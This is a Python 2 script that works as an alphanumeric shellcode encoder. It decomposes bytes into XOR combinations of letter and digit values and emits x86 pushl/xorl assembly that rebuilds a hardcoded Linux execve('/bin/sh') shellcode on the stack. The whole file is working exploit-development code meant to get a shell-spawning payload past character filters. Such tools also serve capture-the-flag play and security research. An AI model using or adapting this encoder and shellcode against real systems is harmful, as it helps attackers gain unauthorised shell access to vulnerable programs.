numbers = "".join(str(i) for i in range(10))
lowercase = "".join(chr(n) for n in range(ord('a'), ord('z') + 1))
uppercase = "".join(chr(n) for n in range(ord('A'), ord('Z') + 1))
alphanumeric = [ord(c) for c in numbers + lowercase + uppercase]
alphanumericff = [ord(c) for c in numbers.replace("0", "\xff") + lowercase + uppercase]

l = {}
l[0xff] = [0xff, 0x31, 0x31]
expand = {}
for x in alphanumeric:
	for y in alphanumeric:
		if (x ^ y in alphanumeric):
			expand[x ^ y] = [x, y]

for x in alphanumericff:
	if not (x in l): l[x] = [x]

for x in alphanumericff:
	for y in alphanumeric:
		if not (x ^ y in l): l[x ^ y] = [x, y]

for x in alphanumericff:
	for y in alphanumeric:
		for z in alphanumeric:
			n = x ^ y ^ z
			if not (n in l):
				l[n] = [x, y, z]

def display():
	for n in range(len(l)):
		print hex(n) + " = " + " ^ ".join(hex(x) for x in l[n])

def decompose(chars):
	# print chars
	nwords = max(len(l[c]) for c in chars)
	words = [ [] for i in range(nwords)]
	# print words
	for c in chars:
		i = 0
		for dec in l[c]:
			words[i].append(dec)
			i += 1
		while (i < nwords):
			dec1, dec2 = expand[words[i - 1][-1]]
			words[i - 1][-1] = dec1
			words[i].append(dec2)
			i += 1
	return words

def to_hex_word(word):
	return "0x" + "".join(chr([i, 0x30][int(i == 0xff)]).encode('hex') for i in word[::-1])

if __name__ == "__main__":
	for x in alphanumeric:
		print hex(x) + " = " + " ^ ".join(hex(z) for z in expand[x])
	display()
	print decompose([0x90, 0x90, 0xcd, 0x80])
	print decompose([ord(c) for c in "abcd"])
	sc = "\x6a\x0b\x58\x99\x52\xeb\x08\x89\xe1\x5b\x88\x53\x07\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
	sc += (-len(sc) % 4) * "\x90"
	print sc
	print len(sc)
	all_words = [decompose([ord(c) for c in sc[4 * i:4 * i + 4]]) for i in range(len(sc) / 4)]
	for words in all_words:
		print [to_hex_word(word) for word in words]
		word0 = words[0]
		s = "\t" + "pushl $" + to_hex_word(word0)
		for i in range(4):
			if word0[i] == 0xff: s += "\n\t" + "xorb %dl, 0x" + str(34 + i) + "(%esp, %esi)"
		s += "\n\t" + "popl %eax"
		for i in range(1, len(words)):
			s += "\n\t" + "xorl $" + to_hex_word(words[i]) + ", %eax"
		s += "\n\t" + "pushl %eax"
		print s


if False:
	scc = ["", "", ""]
	for c in sc:
		for i in range(3):
			scc[i] += chr(l[ord(c)][i])

	scc[2] = "".join([c, "0"][c == "\xff"] for c in scc[2])
	print scc

	for i in range(3):
		print "".join("\\x" + c.encode("hex") for c in scc[i])
